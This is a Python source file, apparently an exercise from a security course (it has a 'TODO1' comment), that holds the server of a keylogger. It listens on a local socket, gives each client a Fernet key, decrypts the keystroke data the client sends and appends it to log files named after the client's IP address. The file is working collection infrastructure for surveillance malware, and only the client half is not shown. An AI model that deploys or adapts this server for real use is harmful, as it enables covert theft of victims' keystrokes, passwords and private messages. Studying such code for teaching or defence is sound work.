import socket
from cryptography.fernet import Fernet
import time
import os

# This is server's code
print("============================== This is server's console ==============================")

# Define the server's IP address and port
server_ip = '127.0.0.1'
server_port = 15683

log_directory = "keylogs"
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Generate a Fernet key
# The key is generated once! We will use this "key" to send to the client
key = Fernet.generate_key()

# Create a Fernet cipher with the generated key
# TODO1:
# Use the Fernet() constructor function and pass the "key" as an argument to construct the cipher_suite object
cipher_suite = Fernet(key)

# Create a socket object
server_socket = socket.socket()

# Bind the server socket to the IP address and port
server_socket.bind((server_ip, server_port))
while True:
    # Listen for incoming connections
    server_socket.listen()
    print("Server is listening on IP address: ", server_ip, ", port: " ,server_port)

    # Accept a connection from a client
    client_socket, client_address = server_socket.accept()
    print("Accepted connection from: ", client_address)

    # Send the key to the client
    client_socket.send(key)

    encrypted_message = client_socket.recv(1024)

    decrypted_message = cipher_suite.decrypt(encrypted_message).decode()

    time_stamp = time.time()
    # Retrieve client IP address
    client_ip = client_address[0]
    log_file = "keylogs/" + str(client_ip) + ".txt"
    with open(log_file, 'a+') as f:
        f.write(decrypted_message)
    # Close the sockets

    client_socket.close()

server_socket.close()
